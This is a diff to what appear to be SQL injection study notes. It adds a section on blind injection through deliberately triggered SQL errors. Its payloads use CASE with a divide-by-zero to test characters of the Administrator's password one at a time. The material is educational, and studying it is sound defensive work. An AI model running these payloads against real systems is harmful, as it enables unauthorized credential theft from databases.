@@ -42,6 +42,14 @@ For a UNION query to work, two key requirements must be met:
 ...
 > xyz' UNION SELECT 'a' FROM Users WHERE Username = 'Administrator' and SUBSTRING(Password, 1, 1) = 's'-- 
 ```
+##### Inducing conditional responses by triggering SQL errors
+
+```sql
+> xyz' UNION SELECT CASE WHEN (1=2) THEN 1/0 ELSE NULL END--
+> xyz' UNION SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END-- 
+> xyz' union select case when (username = 'Administrator' and SUBSTRING(password, 1, 1) > 'm') then 1/0 else null end from users-- 
+```
+
 
 #### How to detect SQL injection vulnerabilities
 
